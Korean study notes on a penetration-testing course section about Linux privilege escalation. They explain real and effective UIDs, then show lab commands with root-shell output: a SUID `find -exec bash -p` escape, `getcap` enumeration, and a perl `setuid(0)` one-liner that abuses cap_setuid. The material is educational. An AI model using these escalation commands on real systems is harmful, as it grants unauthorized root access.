# 18.4.1 setuid 바이너리와 capabilities 악용

> **Abusing Setuid Binaries and Capabilities** · PEN-200 §18.4.1

프로세스는 자신을 띄운 주체의 UID/GID 를 물려받음 — 이것이 **real UID/GID** 임. 그런데 패스워드 해시가 든 `/etc/shadow` 는 root 만 쓸 수 있음. 그렇다면 일반 사용자는 자기 패스워드를 어떻게 바꾸는가 — 이 모순을 풀려고 도입된 것이 **effective UID/GID** 이고, 민감한 연산에서 실제로 검사되는 값이 이쪽임.

`passwd` 를 실행한 뒤 입력 대기 상태로 두어 프로세스를 살려 둠.

```
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password:
```

다른 셸에서 그 프로세스를 찾으면 **실행한 것은 joe 인데 root 로 돌고 있음**이 드러남.

```
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1932  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
```

`/proc/<PID>/status` 로 그 프로세스의 UID 값을 직접 확인함(proc 은 커널 정보를 파일처럼 다루게 해 주는 의사 파일시스템임).

```
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid:    1000    0   0   0
```

`Uid` 네 값은 순서대로 **real · effective · saved set · filesystem** UID 임. joe(1000)가 실행했는데 나머지 셋이 root 의 0 임. 대조군으로 joe 의 bash 를 보면 정상 상태가 무엇인지 드러남 — 네 값이 전부 같음.

```
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid:    1000    1000    1000    1000
```

차이의 원인은 바이너리에 걸린 **SUID(Set-User-ID) 플래그**임. `chmod u+s` 로 설정하고, 목록에서 실행 비트 자리에 `s` 로 보임. 효과는 「실행 프로세스의 effective UID 를 **파일 소유자**의 UID 로 맞춤」임.

```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```

정당하고 제한된 형태의 권한 상승이라는 점이 중요함 — 그래서 **SUID 바이너리는 버그가 없어야 하고**, 임의 명령 실행 경로가 하나라도 있으면 그대로 root 로 이어짐.

열거에서 `find` 에 SUID 가 걸려 있음을 확인했다고 하면, `find` 의 `-exec` 로 임의 명령을 실행할 수 있다는 점을 이용함. 아무 존재하는 경로나 검색시킨 뒤 셸을 띄움. `-p` 는 Set Builtin 옵션으로 **effective user 가 초기화되는 것을 막음** — 이게 빠지면 bash 가 권한을 떨궈 버려 root 셸이 안 됨.

```
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root)
groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netd
ev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
root
```

UID 는 여전히 joe 지만 euid 가 root 임 — 이 상태로 root 권한 연산이 통과함.

또 하나의 벡터가 **capabilities** 임. 트래픽 캡처·커널 모듈 적재처럼 원래 관리자에게만 허용된 권한을 프로세스·바이너리·서비스 단위로 쪼개 부여하는 속성이고, setuid 와 마찬가지로 잘못 걸리면 root 로 가는 통로가 됨. 다만 **ELF 안에서 setuid 플래그와 저장 위치가 달라** SUID 검색만으로는 안 잡히므로 별도로 열거해야 함. `getcap -r /` 로 루트부터 재귀 검색하고 오류는 버림.

```
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper =
cap_net_bind_service,cap_net_admin+ep
```

`perl` 둘이 `cap_setuid` 를 가졌고 `+ep` 는 그 capability 가 effective·permitted 임을 뜻함 → 스스로 UID 를 0 으로 바꿀 수 있다는 의미임. 어떤 바이너리를 어떻게 악용하는지는 **GTFOBins** 에서 확인함 — UNIX 바이너리별 권한 상승 방법이 정리된 사이트임.

```
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec
"/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe)
groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netd
ev),112(bluetooth),116(lpadmin),117(scanner)
```

POSIX 의 `setuid(0)` 로 UID 를 0 으로 올린 뒤 셸을 exec 하므로, SUID 경로와 달리 real UID 자체가 0 이 됨.
